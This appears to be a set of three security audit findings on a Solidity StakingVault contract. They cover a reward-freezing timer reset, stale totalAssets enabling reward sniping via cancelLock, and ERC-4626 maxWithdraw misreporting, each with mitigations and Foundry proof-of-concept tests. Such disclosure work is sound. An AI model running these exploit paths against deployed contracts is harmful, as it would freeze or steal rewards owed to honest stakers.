# Title
Reward distribution can be permanently stalled via high-frequency timer resets

## Summary
The `StakingVault` protocol uses an exponential decay model to distribute rewards via the `_calculateHandout` function. But the protocol contains a critical logic flaw: it unconditionally resets the distribution timer`(payoutLastPaid or nativeRewardsLastPaid)` even when zero rewards are distributed due to precision loss.

An attacker can exploit this by calling `poke()` (or any function with the accrueRewards modifier) at a high frequency (i.e every block). When the elapsed time is minimal, the `handoutPercentage` becomes so small that the resulting `tokensToHandout` rounds down to zero. Because the timer is reset to the current block.timestamp, the "unaccounted balance" never sees enough elapsed time to cross the 1-wei rounding threshold, effectively creating a "Dead Zone" where rewards are permanently frozen.

```solidity
// StakingVault.sol - _accrueRewards function
uint256 tokensToHandout = _calculateHandout(unaccountedBalance, elapsed);

if (tokensToHandout != 0) {
    uint256 deltaIndex = Math.mulDiv(tokensToHandout, SCALAR * uint256(10 ** decimals()), totalSupply());
    rewardInfo.rewardIndex += deltaIndex;
    rewardInfo.balanceAccounted += tokensToHandout;
}

// Bug: Timer is updated even if tokensToHandout was 0
rewardInfo.payoutLastPaid = block.timestamp;
```

[Code Reference](https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L441-L453)

[Docs Reference](https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/README.md?plain=1#L400)

## Impact
**Severity: High**
- Permanent Value Lock: For low-decimal tokens (i.e GUSD, USDC or 0-decimal RWA tokens), the rounding floor is significant. As demonstrated in calculations, hundreds of thousands of units of value can be trapped in the "Dead Zone" indefinitely.
- Functional DoS of Vault Yield: Since native `asset()` rewards use the same logic, an attacker can prevent the Vault's exchange rate from increasing, effectively breaking the ERC4626 "Share Price" mechanism.
- Systemic Failure: The core invariant that "rewards accrue over time" is completely broken by a third-party actor.

**Likelihood: High**
- Zero-Cost Attack: An attacker can trigger this via `poke()` or other permissionless interactions at the cost of basic gas.
- Bot-Friendly: High-frequency spam is easily automated on L2s or low-gas environments.

## Mitigation
The distribution timer should only be updated if a non-zero amount of rewards has been distributed. This allows the elapsed time to accumulate until the rounding error is overcome.
```solidity
function _accrueRewards(address _rewardToken) internal {
    // ...
    uint256 tokensToHandout = _calculateHandout(unaccountedBalance, elapsed);

    if (tokensToHandout != 0) {
        uint256 deltaIndex = Math.mulDiv(tokensToHandout, SCALAR * uint256(10 ** decimals()), totalSupply());
        rewardInfo.rewardIndex += deltaIndex;
        rewardInfo.balanceAccounted += tokensToHandout;
        
        // FIX: Only update timestamp when progress is made
        rewardInfo.payoutLastPaid = block.timestamp;
    }
}
```


## POC

Paste this test in `test/StakingVault.t.sol`

```solidity
    function test_PermanentRewardDoS() public {
        _mintAndDepositFor(ACTOR_ALICE, 1000e18);

        MockUSDC usdc = new MockUSDC();
        _registerRewardToken(address(usdc));
        vm.prank(address(timelock));
        vault.addRewardToken(address(usdc));

        uint256 donationAmount = 0.1e6;
        usdc.mint(address(vault), donationAmount);

        (uint256 lastPaidInitial, uint256 indexInitial, uint256 accountedInitial,,) =
            vault.rewardTrackers(address(usdc));

        // Attack: 1 hour of pokes
        for (uint256 i = 0; i < 3600; i++) {
            vm.warp(block.timestamp + 1);
            vault.poke();
        }

        (uint256 lastPaidFinal, uint256 indexFinal, uint256 accountedFinal,,) = vault.rewardTrackers(address(usdc));

        // This will now Fail as the rewards are frozen
        assertEq(indexFinal, indexInitial, "Reward index should not have increased");
        assertEq(accountedFinal, accountedInitial, "Accounted balance should not have increased");

        console.log("Attack successful: Balance was small enough to round to zero.");
    }
```

# Title
Stale totalAssets in StakingVault allows strategic reward capture via lock cancellation

## Summary
The StakingVault implements a native asset reward mechanism where rewards sent directly to the contract are distributed over time. But the vault’s exchange rate logic relies on a stale cached balance `nativeBalanceLastKnown`, creating a window where the vault’s share price does not reflect newly received assets.

The protocol attempts to prevent stale accounting using the `accrueRewards` modifier on the internal `_deposit` and `_withdraw` functions. This fails because of the call order in the OpenZeppelin ERC4626 implementation:
- When `deposit()` or `redeem()` is called, the contract first executes `previewDeposit()` or `previewRedeem()` to calculate the shares/assets.
- These preview functions are view calls that rely on `totalAssets()`. At this stage, the `accrueRewards` modifier has not yet run, so `totalAssets()` returns a value based on the stale `nativeBalanceLastKnown`.
- The `accrueRewards` modifier only executes when the code finally enters the internal `_deposit` or `_withdraw` functions. By this time, the share amount is already fixed based on the incorrect, stale price.

**Exploit Path:**
- A user initiates an unstaking request to move their assets into the `UnstakingManager`. This removes their shares and reduces `totalSupply`, but allows them to re-enter atomically via `cancelLock`.
- Underlying assets are transferred to the `StakingVault`.
- Because the `totalAssets()` view relies on `nativeBalanceLastKnown`, it continues to report the old balance. The exchange rate remains 1:1 despite the contract holding more assets.
- The user calls `UnstakingManager.cancelLock()`. This triggers `vault.deposit()`.
- The `ERC4626.deposit` flow calls `previewDeposit` to calculate shares. Since `totalAssets()` is stale, the user mints shares at the old, undervalued price.
- Only after the shares are calculated does the `accrueRewards` modifier run, updating `nativeBalanceLastKnown` to the current balance.
- The user now holds shares that immediately represent a portion of the rewards that were present before they re-entered, effectively diluting the rewards meant for long-term stakers.

```solidity
// StakingVault.sol

// StakingVault.sol

// @Bug This view is called by ERC4626.deposit() before the modifier runs
function totalAssets() public view override returns (uint256) {
    return totalDeposited + _currentAccountedNativeRewards();
}

// @Bug The modifier is here, but share calculation happened before this call
function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
    internal
    override
    accrueRewards(caller, receiver) 
{
    totalDeposited += assets;
    nativeBalanceLastKnown += assets;
    super._deposit(caller, receiver, assets, shares);
}

function _currentAccountedNativeRewards() internal view returns (uint256) {
    uint256 elapsed = block.timestamp - nativeRewardsLastPaid;
    // @Bug rewardsBalance is calculated using the stale cached balance
    uint256 rewardsBalance = nativeBalanceLastKnown - totalDeposited;

    return _calculateHandout(rewardsBalance, elapsed);
}
```

[Code Reference](https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L240-L243)

[Code Reference](https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L252-L261)

[Code Reference](https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L245-L250)

## Impact

**Severity: High**
The vulnerability allows for Risk Free Reward Sniping. Users can park their capital in the `UnstakingManager`, avoiding any negative exposure or locking, and atomically re-enter the vault via cancelLock to capture a share of "unaccrued" native rewards. This dilutes honest, long-term stakers and can be executed via sandwiching whenever a reward transfer is detected in the mempool.

**Likelihood: High**
Since `totalAssets` is a core part of the ERC4626 standard and is used for every deposit/mint, this is not an edge case. Any donation or transfer of the underlying asset to the vault(which is the intended way to distribute native rewards) triggers this stale-price window.

## Mitigation

**Option 1: Early Accrual**
Ensure that `_accrueRewards()` is called at the very beginning of the `deposit, mint, withdraw and redeem` functions (before preview logic runs) to synchronize the state before the exchange rate is calculated.

**Option 2: Dynamic Balance Lookups**
Update `totalAssets()` to check the actual `balanceOf(address(this))` instead of relying on the cached `nativeBalanceLastKnown`. This ensures the exchange rate is always calculated using the true current balance.

## POC

Paste this test in: `test/StakingVault.t.sol`

```solidity
    function test_PoC_rewardSnipingViaCancelLock() public {
        // Alice and Bob are initial stakers
        uint256 initialDeposit = 1000e18;
        _mintAndDepositFor(ACTOR_ALICE, initialDeposit);
        _mintAndDepositFor(ACTOR_BOB, initialDeposit);

        // Alice decides to "park" her funds in the UnstakingManager
        vm.startPrank(ACTOR_ALICE);
        vault.redeem(initialDeposit, ACTOR_ALICE, ACTOR_ALICE);
        vm.stopPrank();

        // Verify Bob is the only one "active" in the vault via shares
        assertEq(vault.totalSupply(), initialDeposit);

        // 1000 TEST tokens are sent to the vault as rewards
        uint256 donationAmount = 1000e18;
        token.mint(address(vault), donationAmount);

        // The BUG: totalAssets is STALE.
        // It should be > 1000e18 because 1000e18 was just donated.
        // But it returns exactly the old totalDeposited (1000e18).
        assertEq(vault.totalAssets(), initialDeposit);

        // Alice snipes by cancelling her lock.
        // Because totalAssets() is 1000 and totalSupply is 1000,
        // she gets shares at exactly 1:1, ignoring the donation.
        UnstakingManager manager = vault.unstakingManager();
        vm.prank(ACTOR_ALICE);
        manager.cancelLock(0);

        // Alice got her 1000 shares back "on the cheap"
        assertEq(vault.balanceOf(ACTOR_ALICE), initialDeposit);

        // Accrue rewards so the vault "sees" the money
        vm.warp(block.timestamp + 1);
        vault.poke();

        // Distribute rewards over time
        _payoutRewards(10);

        // Alice and Bob now have nearly equal value.
        // Alice successfully captured ~50% of a reward that was donated
        // while she wasn't even in the vault.
        uint256 aliceValue = vault.previewRedeem(vault.balanceOf(ACTOR_ALICE));
        uint256 bobValue = vault.previewRedeem(vault.balanceOf(ACTOR_BOB));

        assertGt(aliceValue, initialDeposit);
        assertApproxEqRel(aliceValue, bobValue, 0.01e18);

        console.log("Alice Value after snipe:", aliceValue);
        console.log("Bob Value (diluted):", bobValue);
    }
```

# Title
maxWithdraw and maxRedeem misrepresent immediate liquidity during unstaking delays

## Summary
The StakingVault implements the ERC-4626 standard but fails to correctly override `maxWithdraw` and `maxRedeem` when an `unstakingDelay` is active. According to EIP-4626, these functions must return the maximum amount of assets/shares that can be withdrawn/redeemed to the receiver in the same transaction.

In `StakingVault`, when `unstakingDelay > 0`, the withdraw and redeem functions do not transfer assets to the receiver; instead, they redirect them to the `UnstakingManager` to be locked. Consequently, the receiver receives 0 immediate liquid assets. By returning the full balance, the vault "lies" about its immediate liquidity, which can brick external integrations like withdrawal queues or aggregators.


[Code Reference](https://github.com/reserve-protocol/reserve-governor/blob/dc27a68463cec356ff18bbdd3d8edfe9b2534372/contracts/staking/StakingVault.sol#L65)


## Impact
**Severity: Medium**
Breaks ERC-4626 Compliance: EIP-4626 explicitly states that `maxWithdraw` and `maxRedeem` MUST return the amount of assets/shares that can be withdrawn/redeemed to the receiver in the same transaction.

**Likelihood: High**
Constant Violation: This vulnerability is active 100% of the time whenever an unstakingDelay is set by the protocol. Since the delay is a core feature of the `StakingVault`, the misrepresentation is a persistent state.

## Mitigation 

Override `maxWithdraw` and `maxRedeem` in `StakingVault` to return 0 if a delay is active.

```solidity
function maxWithdraw(address owner) public view override returns (uint256) {
    if (unstakingDelay > 0) return 0;
    return super.maxWithdraw(owner);
}

function maxRedeem(address owner) public view override returns (uint256) {
    if (unstakingDelay > 0) return 0;
    return super.maxRedeem(owner);
}
```

## POC

Paste this test in `test/StakingVault.t.sol`

```solidity
function test_maxWithdraw_MisrepresentsLiquidity() public {
        // Alice deposits 1000 tokens
        uint256 amount = 1000e18;
        _mintAndDepositFor(ACTOR_ALICE, amount);

        // Set an unstaking delay(active state)
        vm.prank(address(timelock));
        vault.setUnstakingDelay(7 days);

        // Check maxWithdraw - it reports full balance
        uint256 reportedMax = vault.maxWithdraw(ACTOR_ALICE);
        assertEq(reportedMax, amount, "Should report full balance");

        // Record Alice's actual liquid token balance
        uint256 aliceBalanceBefore = token.balanceOf(ACTOR_ALICE);

        // Alice attempts to withdraw based on the 'max' reported
        vm.prank(ACTOR_ALICE);
        vault.withdraw(reportedMax, ACTOR_ALICE, ACTOR_ALICE);

        // Alice received 0 tokens (Liquidity = 0)
        uint256 aliceBalanceAfter = token.balanceOf(ACTOR_ALICE);
        
        // This confirms the misrepresentation:
        assertEq(aliceBalanceAfter - aliceBalanceBefore, 0, "Alice should have received 0 liquid tokens");
        
        console.log("maxWithdraw reported:", reportedMax);
        console.log("Actual liquid assets received:", aliceBalanceAfter - aliceBalanceBefore);
    }
```
